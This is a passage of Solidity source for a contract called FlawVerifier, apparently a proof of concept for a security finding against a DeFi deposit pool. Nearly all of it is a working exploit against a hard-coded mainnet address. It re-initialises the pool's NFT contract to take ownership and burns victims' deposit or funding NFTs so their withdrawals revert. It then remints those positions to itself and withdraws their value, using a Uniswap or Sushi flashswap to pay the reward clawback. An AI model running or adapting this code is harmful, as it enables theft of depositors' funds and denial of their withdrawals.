    function owner() external view returns (address);
    function init(address newOwner, string calldata tokenName, string calldata tokenSymbol) external;
    function ownerOf(uint256 tokenId) external view returns (address);
    function burn(uint256 tokenId) external;
    function mint(address to, uint256 tokenId) external;
}

interface IDInterestLike {
    struct Deposit {
        uint256 amount;
        uint256 maturationTimestamp;
        uint256 interestOwed;
        uint256 initialMoneyMarketIncomeIndex;
        bool active;
        bool finalSurplusIsNegative;
        uint256 finalSurplusAmount;
        uint256 mintMPHAmount;
        uint256 depositTimestamp;
    }

    struct Funding {
        uint256 fromDepositID;
        uint256 toDepositID;
        uint256 recordedFundedDepositAmount;
        uint256 recordedMoneyMarketIncomeIndex;
        uint256 creationTimestamp;
    }

    function depositNFT() external view returns (address);
    function fundingNFT() external view returns (address);
    function stablecoin() external view returns (address);
    function moneyMarket() external view returns (address);
    function mphMinter() external view returns (address);
    function depositsLength() external view returns (uint256);
    function fundingListLength() external view returns (uint256);
    function getDeposit(uint256 depositID) external view returns (Deposit memory);
    function getFunding(uint256 fundingID) external view returns (Funding memory);
    function depositIsFunded(uint256 depositID) external view returns (bool);
    function withdraw(uint256 depositID, uint256 fundingID) external;
    function earlyWithdraw(uint256 depositID, uint256 fundingID) external;
    function payInterestToFunder(uint256 fundingID) external returns (uint256 interestAmount);
}

interface IMoneyMarketLike {
    function incomeIndex() external view returns (uint256);
}

interface IMPHMinterLike {
    function mph() external view returns (address);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address public constant TARGET = 0xF0b7DE03134857391d8D43Ed48e20EDF21461097;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    address private _profitToken;
    uint256 private _profitAmount;

    address public pool;
    uint256 public hijackedTokenId;
    uint256 public linkedFundingId;
    bool public targetIsDepositNFT;
    bool public targetIsFundingNFT;
    bool public hypothesisValidated;
    bool public burnedVictimToken;
    bool public ownerQueryRevertedAfterBurn;
    bool public demonstratedPathRevert;
    bool public usedEarlyWithdraw;
    address public victimOwnerBeforeBurn;
    string public exploitPath;
    string public failureReason;

    address private _expectedFlashPair;
    address private _flashStablecoin;
    address private _flashMPH;
    address private _flashRouter;
    address private _flashDepositNFT;
    address private _flashMPHMinter;
    uint256 private _flashDepositID;
    uint256 private _flashFundingID;
    bool private _flashUseEarly;
    uint256 private _flashMPHNeeded;
    uint256 private _flashBorrowedStable;
    uint256 private _flashPathLength;
    address private _flashPath0;
    address private _flashPath1;
    address private _flashPath2;

    constructor() {}

    function executeOnOpportunity() public {
        if (hypothesisValidated || bytes(failureReason).length != 0) {
            return;
        }

        INFTLike targetNft = INFTLike(TARGET);
        pool = targetNft.owner();
        if (pool == address(0)) {
            failureReason = "target owner is zero";
            return;
        }

        IDInterestLike market = IDInterestLike(pool);
        address depositNftAddr = market.depositNFT();
        address fundingNftAddr = market.fundingNFT();
        _profitToken = market.stablecoin();
        _profitAmount = 0;

        targetIsDepositNFT = depositNftAddr == TARGET;
        targetIsFundingNFT = fundingNftAddr == TARGET;
        if (!targetIsDepositNFT && !targetIsFundingNFT) {
            failureReason = "target NFT not wired into pool";
            return;
        }

        // Step 1 from the finding: reinitialize the live NFT clone and seize ownership.
        targetNft.init(address(this), "hijacked", "HIJACKED");
        if (targetNft.owner() != address(this)) {
            failureReason = "reinitialization failed";
            return;
        }
        hypothesisValidated = true;

        if (targetIsDepositNFT) {
            exploitPath =
                "init(target depositNFT) -> burn(victim deposit NFT) -> ownerOf(tokenId) reverts -> victim withdraw path reverts; then reuse seized owner-only burn/mint with flashswap-sourced MPH to remint another live deposit NFT and steal its withdrawal value";
            _demonstrateDepositDoS(market, INFTLike(depositNftAddr));
        } else {
            exploitPath =
                "init(target fundingNFT) -> burn(victim funding NFT) -> ownerOf(tokenId) reverts -> funder payout path reverts; then seize deposit/funding NFT owner-only burn/mint powers to realize profit";
            _demonstrateFundingDoS(market, INFTLike(fundingNftAddr));
        }

        if (bytes(failureReason).length != 0) {
            return;
        }

        // Economic realization:
        // Prefer a UniswapV2/Sushi-like flashswap only when the stolen deposit's withdrawal
        // requires sourcing MPH for the pool's reward clawback. This does not change the root
        // cause: the theft still comes from unrestricted NFT reinitialization giving live
        // owner-only burn/mint powers over the pool's deposit/funding NFTs.
        if (_profitAmount == 0) {
            _attemptDepositTheft(market, depositNftAddr);
        }
        if (_profitAmount == 0) {
            _attemptFundingInterestTheft(market, fundingNftAddr);
        }
        if (_profitAmount == 0 && bytes(failureReason).length == 0) {
            failureReason = "exploit demonstrated but no profit path realized";
        }
    }

    function uniswapV2Call(address sender, uint256, uint256, bytes calldata) external {
        require(msg.sender == _expectedFlashPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        address[] memory path = new address[](_flashPathLength);
        if (_flashPathLength > 0) path[0] = _flashPath0;
        if (_flashPathLength > 1) path[1] = _flashPath1;
        if (_flashPathLength > 2) path[2] = _flashPath2;

        if (_flashMPHNeeded > 0) {
            _approveToken(_flashStablecoin, _flashRouter, _flashBorrowedStable);
            IUniswapV2RouterLike(_flashRouter).swapTokensForExactTokens(
                _flashMPHNeeded,
                _flashBorrowedStable,
                path,
                address(this),
                block.timestamp
            );
            _approveToken(_flashMPH, _flashMPHMinter, _flashMPHNeeded);
        }

        INFTLike depositNft = INFTLike(_flashDepositNFT);
        depositNft.burn(_flashDepositID);
        depositNft.mint(address(this), _flashDepositID);

        if (_flashUseEarly) {
            IDInterestLike(pool).earlyWithdraw(_flashDepositID, _flashFundingID);
        } else {
            IDInterestLike(pool).withdraw(_flashDepositID, _flashFundingID);
        }

        uint256 repayment = _sameTokenFlashRepayment(_flashBorrowedStable);
        _safeTransfer(_flashStablecoin, msg.sender, repayment);
        _clearFlashContext();
        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _demonstrateDepositDoS(IDInterestLike market, INFTLike depositNft) internal {
        (uint256 depositID, uint256 fundingID, bool useEarly) = _findDepositDoSCandidate(market, depositNft, 0);
        if (depositID == 0) {
            failureReason = "no burnable deposit NFT candidate found";
            return;
        }

        hijackedTokenId = depositID;
        linkedFundingId = fundingID;
        usedEarlyWithdraw = useEarly;
        victimOwnerBeforeBurn = depositNft.ownerOf(depositID);

        // Step 2 from the finding: burn a live victim deposit NFT after seizing ownership.
        depositNft.burn(depositID);
        burnedVictimToken = true;

        // Step 3 from the finding: ownerOf() no longer returns a valid holder.
        ownerQueryRevertedAfterBurn = _ownerQueryReverts(depositNft, depositID);

        (bool reverted, ) = useEarly
            ? _callEarlyWithdraw(address(market), depositID, fundingID)
            : _callWithdraw(address(market), depositID, fundingID);
        demonstratedPathRevert = reverted;

        if (!ownerQueryRevertedAfterBurn) {
            failureReason = "burn succeeded but ownerOf still resolves";
        } else if (!demonstratedPathRevert) {
            failureReason = "burned deposit NFT but withdraw path did not revert";
        }
    }

    function _demonstrateFundingDoS(IDInterestLike market, INFTLike fundingNft) internal {
        uint256 fundingID = _findExistingFundingToken(market, fundingNft, 0);
        if (fundingID == 0) {
            failureReason = "no burnable funding NFT candidate found";
            return;
        }

        hijackedTokenId = fundingID;
        linkedFundingId = fundingID;
        victimOwnerBeforeBurn = fundingNft.ownerOf(fundingID);

        // Step 2 from the finding: burn a live victim funding NFT after seizing ownership.
        fundingNft.burn(fundingID);
        burnedVictimToken = true;

        // Step 3 from the finding: ownerOf() no longer returns a valid holder.
        ownerQueryRevertedAfterBurn = _ownerQueryReverts(fundingNft, fundingID);

        (bool reverted, ) = _callPayInterestToFunder(address(market), fundingID);
        demonstratedPathRevert = reverted;

        if (!ownerQueryRevertedAfterBurn) {
            failureReason = "burn succeeded but ownerOf still resolves";
        } else if (!demonstratedPathRevert) {
            failureReason = "burned funding NFT but payout path did not revert";
        }
    }

    function _attemptDepositTheft(IDInterestLike market, address depositNftAddr) internal {
        INFTLike depositNft = INFTLike(depositNftAddr);
        if (depositNft.owner() != address(this)) {
            depositNft.init(address(this), "profit-deposit", "PDEPOSIT");
            if (depositNft.owner() != address(this)) {
                return;
            }
        }

        (uint256 depositID, uint256 fundingID, bool useEarly, uint256 mphNeeded) = _findProfitDepositCandidate(
            market,
            depositNft,
            hijackedTokenId
        );
        if (depositID == 0) {
            return;
        }

        address mphMinter = market.mphMinter();
        address mph = IMPHMinterLike(mphMinter).mph();

        if (mphNeeded == 0) {
            depositNft.burn(depositID);
            depositNft.mint(address(this), depositID);
            if (useEarly) {
                market.earlyWithdraw(depositID, fundingID);
            } else {
                market.withdraw(depositID, fundingID);
            }
            _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
            return;
        }

        _launchFlashswapDepositTheft(
            depositNftAddr,
            mphMinter,
            mph,
            depositID,
            fundingID,
            useEarly,
            mphNeeded
        );
    }

    function _launchFlashswapDepositTheft(
        address depositNftAddr,
        address mphMinter,
        address mph,
        uint256 depositID,
        uint256 fundingID,
        bool useEarly,
        uint256 mphNeeded
    ) internal {
        (address flashPair, address router, address[] memory path) = _locateFlashswapPlan(_profitToken, mph);
        if (flashPair == address(0) || router == address(0) || path.length < 2) {
            return;
        }

        uint256 stableNeeded;
        try IUniswapV2RouterLike(router).getAmountsIn(mphNeeded, path) returns (uint256[] memory amountsIn) {
            stableNeeded = amountsIn[0];
        } catch {
            return;
        }
        if (stableNeeded == 0) {
            return;
        }

        uint256 borrowedStable = (stableNeeded * 101) / 100 + 1;
        _expectedFlashPair = flashPair;
        _flashStablecoin = _profitToken;
        _flashMPH = mph;
        _flashRouter = router;
        _flashDepositNFT = depositNftAddr;
        _flashMPHMinter = mphMinter;
        _flashDepositID = depositID;
        _flashFundingID = fundingID;
        _flashUseEarly = useEarly;
        _flashMPHNeeded = mphNeeded;
        _flashBorrowedStable = borrowedStable;
        _flashPathLength = path.length;
        _flashPath0 = path.length > 0 ? path[0] : address(0);
        _flashPath1 = path.length > 1 ? path[1] : address(0);
        _flashPath2 = path.length > 2 ? path[2] : address(0);

        IUniswapV2PairLike pair = IUniswapV2PairLike(flashPair);
        if (pair.token0() == _profitToken) {
            pair.swap(borrowedStable, 0, address(this), hex"01");
        } else if (pair.token1() == _profitToken) {
            pair.swap(0, borrowedStable, address(this), hex"01");
        } else {
            _clearFlashContext();
        }
    }

    function _attemptFundingInterestTheft(IDInterestLike market, address fundingNftAddr) internal {
        INFTLike fundingNft = INFTLike(fundingNftAddr);
        if (fundingNft.owner() != address(this)) {
            fundingNft.init(address(this), "profit-funding", "PFUND");
            if (fundingNft.owner() != address(this)) {
                return;
            }
        }

        uint256 currentIncomeIndex = IMoneyMarketLike(market.moneyMarket()).incomeIndex();
        if (currentIncomeIndex == 0) {
            return;
        }

        uint256 fundingID = _findMostProfitableFunding(market, fundingNft, linkedFundingId, currentIncomeIndex);
        if (fundingID == 0) {
            return;
        }

        fundingNft.burn(fundingID);
        fundingNft.mint(address(this), fundingID);
        market.payInterestToFunder(fundingID);
        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
    }

    function _findDepositDoSCandidate(IDInterestLike market, INFTLike depositNft, uint256 avoidTokenId)
        internal
        view
        returns (uint256 depositID, uint256 fundingID, bool useEarly)
    {
        uint256 len = market.depositsLength();
        for (uint256 i = 1; i <= len; i++) {
            if (i == avoidTokenId || !_tokenExists(depositNft, i)) {
                continue;
            }
            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
            if (!deposit.active) {
                continue;
            }
            uint256 linked = 0;
            if (market.depositIsFunded(i)) {
                linked = _findFundingForDeposit(market, i);
                if (linked == 0) {
                    continue;
                }
            }
            return (i, linked, block.timestamp < deposit.maturationTimestamp);
        }
    }

    function _findProfitDepositCandidate(IDInterestLike market, INFTLike depositNft, uint256 avoidTokenId)
        internal
        view
        returns (uint256 depositID, uint256 fundingID, bool useEarly, uint256 mphNeeded)
    {
        uint256 len = market.depositsLength();
        uint256 bestAmount = 0;
        uint256 bestMPH = type(uint256).max;

        for (uint256 i = 1; i <= len; i++) {
            if (i == avoidTokenId || !_tokenExists(depositNft, i)) {
                continue;
            }

            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
            if (!deposit.active) {
                continue;
            }

            bool early = block.timestamp < deposit.maturationTimestamp;
            if (!early) {
                continue;
            }

            uint256 linked = 0;
            if (market.depositIsFunded(i)) {
                // Prefer simpler unfunded positions to keep the execution route deterministic.
                continue;
            }

            if (
                deposit.mintMPHAmount < bestMPH ||
                (deposit.mintMPHAmount == bestMPH && deposit.amount > bestAmount)
            ) {
                bestAmount = deposit.amount;
                bestMPH = deposit.mintMPHAmount;
                depositID = i;
                fundingID = linked;
                useEarly = true;
                mphNeeded = deposit.mintMPHAmount;
            }
        }
    }

    function _findExistingFundingToken(IDInterestLike market, INFTLike fundingNft, uint256 avoidTokenId)
        internal
        view
        returns (uint256 fundingID)
    {
        uint256 len = market.fundingListLength();
        for (uint256 i = 1; i <= len; i++) {
            if (i != avoidTokenId && _tokenExists(fundingNft, i)) {
                return i;
            }
        }
    }

    function _findMostProfitableFunding(
        IDInterestLike market,
        INFTLike fundingNft,
        uint256 avoidTokenId,
        uint256 currentIncomeIndex
    ) internal view returns (uint256 bestFundingID) {
        uint256 len = market.fundingListLength();
        uint256 bestInterest = 0;

        for (uint256 i = 1; i <= len; i++) {
            if (i == avoidTokenId || !_tokenExists(fundingNft, i)) {
                continue;
            }
            IDInterestLike.Funding memory funding = market.getFunding(i);
            if (
                funding.recordedFundedDepositAmount == 0 ||
                funding.recordedMoneyMarketIncomeIndex == 0 ||
                currentIncomeIndex <= funding.recordedMoneyMarketIncomeIndex
            ) {
                continue;
            }

            uint256 estimatedInterest =
                (funding.recordedFundedDepositAmount * currentIncomeIndex) /
                funding.recordedMoneyMarketIncomeIndex - funding.recordedFundedDepositAmount;
            if (estimatedInterest > bestInterest) {
                bestInterest = estimatedInterest;
                bestFundingID = i;
            }
        }
    }

    function _findFundingForDeposit(IDInterestLike market, uint256 depositID) internal view returns (uint256) {
        uint256 len = market.fundingListLength();
        for (uint256 fundingID = 1; fundingID <= len; fundingID++) {
            IDInterestLike.Funding memory funding = market.getFunding(fundingID);
            if (depositID > funding.fromDepositID && depositID <= funding.toDepositID) {
                return fundingID;
            }
        }
        return 0;
    }

    function _locateFlashswapPlan(address stablecoin, address mph)
        internal
        view
        returns (address flashPair, address router, address[] memory path)
    {
        address uniBorrowPair = IUniswapV2FactoryLike(UNI_V2_FACTORY).getPair(stablecoin, WETH);
        if (uniBorrowPair != address(0)) {
            (router, path) = _routeForBorrowDex(false, stablecoin, mph);
            if (router != address(0)) {
                return (uniBorrowPair, router, path);
            }
        }

        address sushiBorrowPair = IUniswapV2FactoryLike(SUSHI_FACTORY).getPair(stablecoin, WETH);
        if (sushiBorrowPair != address(0)) {
            (router, path) = _routeForBorrowDex(true, stablecoin, mph);
            if (router != address(0)) {
                return (sushiBorrowPair, router, path);
            }
        }

        path = new address[](0);
    }

    function _routeForBorrowDex(bool borrowIsSushi, address stablecoin, address mph)
        internal
        view
        returns (address router, address[] memory path)
    {
        if (borrowIsSushi) {
            (router, path) = _routeOnDex(UNI_V2_FACTORY, UNI_V2_ROUTER, stablecoin, mph, true);
            if (router != address(0)) {
                return (router, path);
            }
            return _routeOnDex(SUSHI_FACTORY, SUSHI_ROUTER, stablecoin, mph, false);
        }

        (router, path) = _routeOnDex(SUSHI_FACTORY, SUSHI_ROUTER, stablecoin, mph, true);
        if (router != address(0)) {
            return (router, path);
        }
        return _routeOnDex(UNI_V2_FACTORY, UNI_V2_ROUTER, stablecoin, mph, false);
    }

    function _routeOnDex(
        address factory,
        address router,
        address stablecoin,
        address mph,
        bool allowViaWETH
    ) internal view returns (address, address[] memory path) {
        if (IUniswapV2FactoryLike(factory).getPair(stablecoin, mph) != address(0)) {
            path = new address[](2);
            path[0] = stablecoin;
            path[1] = mph;
            return (router, path);
        }

        if (
            allowViaWETH &&
            IUniswapV2FactoryLike(factory).getPair(stablecoin, WETH) != address(0) &&
            IUniswapV2FactoryLike(factory).getPair(WETH, mph) != address(0)
        ) {
            path = new address[](3);
            path[0] = stablecoin;
            path[1] = WETH;
            path[2] = mph;
            return (router, path);
        }

        path = new address[](0);
        return (address(0), path);
    }

    function _tokenExists(INFTLike nft, uint256 tokenId) internal view returns (bool) {
        try nft.ownerOf(tokenId) returns (address owner_) {
            return owner_ != address(0);
        } catch {
            return false;
        }
    }

    function _ownerQueryReverts(INFTLike nft, uint256 tokenId) internal view returns (bool) {
        try nft.ownerOf(tokenId) returns (address owner_) {
            return owner_ == address(0);
        } catch {
            return true;
        }
    }

    function _sameTokenFlashRepayment(uint256 borrowedAmount) internal pure returns (uint256) {
        return (borrowedAmount * 1000) / 997 + 1;
    }

    function _clearFlashContext() internal {
        _expectedFlashPair = address(0);
        _flashStablecoin = address(0);
        _flashMPH = address(0);
        _flashRouter = address(0);
        _flashDepositNFT = address(0);
        _flashMPHMinter = address(0);
        _flashDepositID = 0;
        _flashFundingID = 0;
        _flashUseEarly = false;
        _flashMPHNeeded = 0;
        _flashBorrowedStable = 0;
        _flashPathLength = 0;
        _flashPath0 = address(0);
        _flashPath1 = address(0);
        _flashPath2 = address(0);
    }

    function _approveToken(address token, address spender, uint256 amount) internal {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, 0));
        require(ok0 && (data0.length == 0 || abi.decode(data0, (bool))), "approve reset failed");
        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _callWithdraw(address market, uint256 depositID, uint256 fundingID)
        internal
        returns (bool reverted, bytes memory returndata)
    {
        (bool ok, bytes memory data) = market.call(
            abi.encodeWithSignature("withdraw(uint256,uint256)", depositID, fundingID)
        );
        return (!ok, data);
    }

    function _callEarlyWithdraw(address market, uint256 depositID, uint256 fundingID)
        internal
        returns (bool reverted, bytes memory returndata)
    {
        (bool ok, bytes memory data) = market.call(
            abi.encodeWithSignature("earlyWithdraw(uint256,uint256)", depositID, fundingID)
        );
        return (!ok, data);
    }

    function _callPayInterestToFunder(address market, uint256 fundingID)
        internal
        returns (bool reverted, bytes memory returndata)
    {
        (bool ok, bytes memory data) = market.call(
            abi.encodeWithSignature("payInterestToFunder(uint256)", fundingID)
        );
        return (!ok, data);
    }
}
